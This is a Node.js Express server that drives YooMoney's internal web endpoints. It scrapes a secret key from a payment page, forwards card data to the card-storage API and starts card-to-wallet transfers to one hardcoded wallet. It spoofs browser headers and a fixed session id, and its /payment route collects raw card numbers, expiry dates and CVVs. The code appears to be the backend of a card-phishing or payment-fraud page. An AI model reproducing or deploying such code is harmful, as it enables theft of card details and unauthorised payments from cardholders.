const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');

const app = express();
const port = 3000;

// Middleware для обработки JSON и urlencoded данных
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Endpoint для получения secretKey
app.post('/api/v1/getSecretKey', async (req, res) => {
    const sum = req.body.sum; // Получаем сумму из тела POST-запроса
    const url = `https://yoomoney.ru/quickpay/confirm.xml?receiver=4100116048803188&quickpay-form=shop&targets=Sponsor%20this%20project&paymentType=SB&sum=${sum}&label=3123132423`;

    try {
        const response = await axios.get(url);
        const htmlContent = response.data;

        // Загружаем HTML-контент в cheerio
        const $ = cheerio.load(htmlContent);

        // Ищем скрипт, содержащий window.__layoutData__
        let secretKey = null;
        $('script').each(function () {
            const scriptContent = $(this).html();
            const match = scriptContent.match(/window\.__layoutData__\s*=\s*({.*?});/);
            if (match) {
                try {
                    const layoutData = JSON.parse(match[1]);
                    if (layoutData.secretKey) {
                        secretKey = layoutData.secretKey;
                        return false; // Выходим из цикла each
                    }
                } catch (error) {
                    console.error('Error parsing JSON:', error);
                }
            }
        });

        if (secretKey) {
            res.json({ "success": "True", "secretKey": secretKey });
        } else {
            const error = "Secret Key not found in HTML response.";
            res.status(500).json({ "success": "False", "systemMessage": error });
        }

    } catch (error) {
        console.error('Error fetching page:', error.message);
        res.status(500).json({ error: 'Failed to retrieve the page' });
    }
});

// Endpoint для отправки данных на указанный URL
app.post('/api/v1/getSynonym', async (req, res) => {
    const url = "https://paymentcard.yoomoney.ru/webservice/storecard/api/storeCardForPayment";
    const data = req.body; // Получаем данные из тела POST-запроса

    try {
        const response = await axios.post(url, data);
        res.json(response.data);
    } catch (error) {
        console.error('Error sending data to YooMoney:', error.message);
        res.status(500).json({ error: 'Failed to send data to YooMoney' });
    }
});

// Endpoint для принятия POST-запроса
app.post('/api/v1/transfer', async (req, res) => {
    const url = "https://yoomoney.ru/transfer/ajax/transfers/getTransferContract";
    const { label, paymentCardSynonym, sum, 'x-csrf-token': csrfToken } = req.body;

    const headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "X-Csrf-Token": csrfToken,
        // Здесь можно добавить другие необходимые заголовки
    };

    const data = {
        withCredentials: true,
        params: {
            origin: "form",
            sender: {
                paymentCardSynonym: paymentCardSynonym
            },
            sum: {
                value: sum.value,
                alphabeticCurrency: "RUB"
            },
            parameters: {
                "shop-host": ""
            },
            schemeTypes: ["anyCardToWallet"],
            persistType: "default",
            recipient: {
                account: "4100116048803188"
            },
            cardBind: false,
            signedForm: {
                params: {}
            },
            formTexts: {
                formComment: "Перевод по кнопке",
                targets: "Перевод по кнопке"
            },
            label: label,
            formSenderInfo: {},
            tmxSessionId: "41ab80c7-8400-53a0-8996-b28ef27678a5"
        }
    };

    try {
        const response = await axios.post(url, data, { headers });
        res.json(response.data);
    } catch (error) {
        console.error('Error sending data to YooMoney:', error.message);
        res.status(500).json({ error: 'Failed to send data to YooMoney' });
    }
});

// Endpoint для принятия POST-запроса
app.post('/api/v1/processPayment', async (req, res) => {
    const url = "https://yoomoney.ru/transfer/ajax/transfers/anyCardToWallet";
    const { xCsrfToken, orderId } = req.body;

    const headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://yoomoney.ru",
        "Referer": `https://yoomoney.ru/transfer/process/confirm?orderId=${orderId}`,
        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "X-Csrf-Token": xCsrfToken
    };

    const data = {
        withCredentials: true,
        params: {
            orderId: orderId,
            extAuthSuccessUri: `https://d043-87-255-92-23.ngrok-free.app/payments/success`,
            extAuthFailUri: `https://d043-87-255-92-23.ngrok-free.app/payments/failed`
        }
    };

    try {
        const response = await axios.post(url, data, { headers });
        res.json(response.data);
    } catch (error) {
        console.error('Error sending data to YooMoney:', error.message);
        res.status(500).json({ error: 'Failed to send data to YooMoney' });
    }
});

// Отдаем статические файлы из папки 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Отдаем статические файлы из папки 'public/assets' по маршруту '/assets'
app.use('/assets', express.static(path.join(__dirname, 'public', 'assets')));

// Основной роут для /
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Основной роут для /
app.get('/payments/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

app.get('/payments/failed', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'failed.html'));
});

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'public'));

app.post('/payment', (req, res) => {
    const { amount, userId, card, date, cvv } = req.body;

    // Проверяем, что date действительно является строкой и имеет минимальную длину 4 символа
    if (typeof date === 'string' && date.length >= 4) {
        // Получаем первые две цифры и последние две цифры
        const firstTwo = date.slice(0, 2);
        const lastTwo = date.slice(-2);

        // Объединяем в нужном порядке
        const modifiedDate = lastTwo + date.slice(2, -2) + firstTwo;

        // Рендерим шаблон 'pay', передавая измененное значение date
        res.render('pay', {
            userId,
            amount,
            card,
            date: modifiedDate,  // Передаем измененную дату
            cvv
        });
    } else {
        // В случае, если date не является строкой или имеет неправильный формат, можно обработать ошибку
        res.status(400).send('Invalid date format');
    }
});


// Запуск сервера
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
